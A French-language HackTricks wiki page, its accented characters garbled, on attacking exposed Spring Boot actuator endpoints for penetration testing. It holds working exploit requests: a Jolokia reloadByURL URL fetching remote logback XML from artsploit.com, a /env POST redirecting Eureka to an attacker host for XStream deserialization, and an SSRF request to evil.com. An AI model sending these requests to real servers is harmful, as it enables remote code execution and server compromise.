# Spring Actuators

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## **Contournement de l'authentification Spring**

<figure><img src="../../.gitbook/assets/image (924).png" alt=""><figcaption></figcaption></figure>

**De** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Exploitation des actuateurs Spring Boot

**Consultez le post original sur** \[**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **Points cl√©s :**

* Les actuateurs Spring Boot enregistrent des points de terminaison tels que `/health`, `/trace`, `/beans`, `/env`, etc. Dans les versions 1 √† 1.4, ces points de terminaison sont accessibles sans authentification. √Ä partir de la version 1.5, seuls `/health` et `/info` ne sont pas sensibles par d√©faut, mais les d√©veloppeurs d√©sactivent souvent cette s√©curit√©.
* Certains points de terminaison Actuator peuvent exposer des donn√©es sensibles ou permettre des actions nuisibles :
* `/dump`, `/trace`, `/logfile`, `/shutdown`, `/mappings`, `/env`, `/actuator/env`, `/restart` et `/heapdump`.
* Dans Spring Boot 1.x, les actuateurs sont enregistr√©s sous l'URL racine, tandis que dans 2.x, ils sont sous le chemin de base `/actuator/`.

### **Techniques d'exploitation :**

1. **Ex√©cution de code √† distance via '/jolokia'** :
* Le point de terminaison `/jolokia` de l'actuateur expose la biblioth√®que Jolokia, qui permet l'acc√®s HTTP aux MBeans.
* L'action `reloadByURL` peut √™tre exploit√©e pour recharger les configurations de journalisation √† partir d'une URL externe, ce qui peut entra√Æner une XXE aveugle ou une ex√©cution de code √† distance via des configurations XML √©labor√©es.
* URL d'exploitation exemple : `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`.
2. **Modification de la configuration via '/env'** :
* Si les biblioth√®ques Spring Cloud sont pr√©sentes, le point de terminaison `/env` permet la modification des propri√©t√©s environnementales.
* Les propri√©t√©s peuvent √™tre manipul√©es pour exploiter des vuln√©rabilit√©s, telles que la vuln√©rabilit√© de d√©s√©rialisation XStream dans l'URL de service Eureka.
*   Exemple de requ√™te POST d'exploitation :

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
3. **Autres param√®tres utiles** :
* Les propri√©t√©s comme `spring.datasource.tomcat.validationQuery`, `spring.datasource.tomcat.url` et `spring.datasource.tomcat.max-active` peuvent √™tre manipul√©es pour diverses exploitations, telles que les injections SQL ou la modification des cha√Ænes de connexion de base de donn√©es.

### **Informations suppl√©mentaires :**

* Une liste compl√®te des actuateurs par d√©faut peut √™tre trouv√©e [ici](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt).
* Le point de terminaison `/env` dans Spring Boot 2.x utilise le format JSON pour la modification des propri√©t√©s, mais le concept g√©n√©ral reste le m√™me.

### **Sujets connexes :**

1. **RCE Env + H2** :
* D√©tails sur l'exploitation de la combinaison du point de terminaison `/env` et de la base de donn√©es H2 peuvent √™tre trouv√©s [ici](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database).
2. **SSRF sur Spring Boot via une interpr√©tation incorrecte du nom de chemin** :
* La manipulation par le framework Spring des param√®tres de matrice (`;`) dans les noms de chemin HTTP peut √™tre exploit√©e pour une falsification de requ√™te c√¥t√© serveur (SSRF).
*   Exemple de requ√™te d'exploitation :

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
